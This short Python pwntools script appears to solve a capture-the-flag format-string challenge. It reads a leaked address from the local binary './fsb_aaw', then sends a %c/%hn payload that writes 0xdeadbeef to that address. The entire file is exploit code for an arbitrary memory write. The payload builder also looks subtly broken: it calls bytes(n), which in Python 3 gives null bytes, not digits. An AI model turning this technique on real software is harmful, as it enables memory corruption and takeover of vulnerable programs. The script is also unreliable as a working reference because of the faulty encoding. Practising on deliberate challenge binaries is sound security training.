# Name: fsb_aaw.py

from pwn import *

def fmt(prev , target):
   if prev < target:
       result = target - prev
       return b"%" + bytes(result)  + b"c"
   elif prev == target:
       return b""
   else:
       result = 0x10000 + target - prev
       return b"%" + bytes(result) + b"c"

def fmt64(offset , target_addr , target_value , prev = 0):
   payload = b""
   for i in range(3):
       payload += p64(target_addr + i * 2)
   payload2 = b""
   for i in range(3):
       target = (target_value >> (i * 16)) & 0xffff
       payload2 += fmt(prev , target) + b"%" + bytes(offset + 8 + i) + b"$hn"
       prev = target
   payload = payload2.ljust(0x40 , b"a") + payload
   return payload

p = process("./fsb_aaw")

p.recvuntil("`secret`: ")
addr_secret = int(p.recvline()[:-1], 16)

#fstring = b"%31337c%8$n".ljust(16)
#fstring += p64(addr_secret)
fstring = fmt64(6, addr_secret, 0xdeadbeef)

p.sendline(fstring)
print(p.recvall())

